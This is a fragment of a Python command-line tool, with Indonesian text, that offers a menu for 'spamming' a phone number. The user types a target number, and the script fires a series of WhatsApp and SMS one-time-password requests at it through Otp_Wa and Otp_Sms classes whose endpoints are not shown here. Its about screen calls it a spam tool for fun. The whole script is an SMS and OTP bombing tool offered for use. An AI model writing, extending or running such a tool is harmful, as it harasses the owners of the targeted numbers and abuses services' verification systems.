        print(f"""     {P}01{R}.{P} Start Spaming
     {P}02{R}.{P} About {Y}&{P} Information Tools
     {P}03{R}.{P} Exit Tools""")
        ammargamteng = int(input(f"\n     [{R}»{P}] Select Menu{Y}:{H} "))
        if ammargamteng == 1:
            banner_anjay()
            phone = input(f"     {P}[{Y}?{P}] Input Nomor {P}({AB}8xxx{P}){Y}:{H} ")

            a = Otp_Wa()
            b = Otp_Sms()

            #  otp wa
            a.Otp1(phone)
            ketik(f"     {P}[{H}✓{P}] Successfully Send Spam WhatsApp (4)")
            a.Otp2(phone)
            ketik(f"     {P}[{H}✓{P}] Successfully Send Spam WhatsApp (5)")
            a.Otp3(phone)
            ketik(f"     {P}[{H}✓{P}] Successfully Send Spam WhatsApp (6)")
            a.Otp4(phone)
            ketik(f"     {P}[{H}✓{P}] Successfully Send Spam WhatsApp (7)")
            a.Otp5(phone)
            ketik(f"     {P}[{H}✓{P}] Successfully Send Spam WhatsApp (8)")
#            a.Otp6(phone)
            ketik(f"     {P}[{H}✓{P}] Successfully Send Spam WhatsApp (9)")
            a.Otp7(phone)
            a.Otp8(phone)

            #otp sms
            b.Otp1(phone)
            ketik(f"     {P}[{H}✓{P}] Successfully Send Spam SMS (12)")
            b.Otp2(phone)
#            b.Otp3(phone)
            b.Otp4(phone)
            b.Otp5(phone)
            b.Otp6(phone)
            b.Otp7(phone)
            hitung_mundur()
        elif ammargamteng == 2:
            banner_anjay()
            print(f"""     {P}[{Y}!{P}] Haloooo, ini adalah Tools Spam Sms,Call,WhatsApp. 
         Tools digunakan untuk Just For Fun, Dengan Spam Otp 
         dan NOTE sewaktu waktu spam yang dihasilkan akan 
         berkurang tergantung Dari API spam yang digunakan 
         Terima Kasih""")
            print(f"     {P}[{R}•{P}] Type Back/Exit.....")
            b_e = input(f"{AB}     ")
            if b_e == "back" or b_e == "Back":
                time.sleep(2)
                anjay()
            elif b_e == "exit" or b_e == "Exit":
                sys.exit(f"     {P}[{Y}!{P}] System Exited")
        elif ammargamteng == 3:
            sys.exit(f"     {P}[{Y}!{P}] System Exited, Thanks For Use")
        else:
            print(f"     {P}[{R}!{P}] Pilih Menu dengan Benarr!!")
            time.sleep(2)
            anjay()
    except requests.exceptions.ConnectionError:
        sys.exit(f"     {P}[{R}!{P}] Error Connection Error....")
#    except ValueError:
 #       sys.exit(f"     {P}[{Y}!{P}] Input Dengan Benar")
    except KeyboardInterrupt:
        sys.exit(f"     {P}[{Y}!{P}] System Exited")

anjay()

#ketik("ebhejeuehebrirjrhvfhfifjfhfifofjjfirkrj rjrjrbbririrjrjrjrjrje")
